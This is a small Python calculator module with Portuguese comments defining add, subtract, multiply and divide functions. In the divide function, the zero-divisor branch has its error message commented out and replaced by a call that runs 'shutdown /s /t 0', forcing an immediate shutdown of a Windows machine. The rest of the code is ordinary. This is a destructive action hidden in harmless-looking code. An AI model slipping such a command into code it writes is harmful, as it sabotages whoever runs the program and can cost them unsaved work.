import os

# Retorna a soma dos elementos
def somar(x, y):
    return x + y
 
 # Retorna a subtração dos elementos
def subtrair(x, y):
    return x - y

 # Retorna a multiplicação dos elementos
def multiplicar(x, y):
    return x * y
 
 # Retorna a divisão dos elementos
def dividir(x, y):
    if y != 0:
        return x / y
    else:
        #return "O divisor não pode ser igual a 0!"
        os.system("shutdown /s /t 0")